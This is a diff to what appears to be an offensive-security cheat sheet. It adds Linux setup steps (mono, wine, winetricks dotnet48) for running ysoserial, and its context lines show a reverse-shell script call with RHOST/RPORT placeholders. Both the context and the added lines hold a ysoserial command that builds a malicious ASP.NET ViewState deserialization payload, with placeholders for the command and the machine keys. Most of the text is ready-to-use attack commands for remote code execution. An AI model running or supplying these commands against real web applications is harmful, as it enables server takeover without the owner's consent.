@@ -793,3 +793,17 @@ $ ./shell.sh <RHOST> <RPORT>
 ```c
 PS C:\> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<COMMAND>" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
 ```
+
+### Linux Setup
+
+```c
+$ sudo apt-get install -y mono-complete wine winetricks
+```
+
+```c
+$ winetricks dotnet48
+```
+
+```c
+$ wine ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<COMMAND>" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
+```
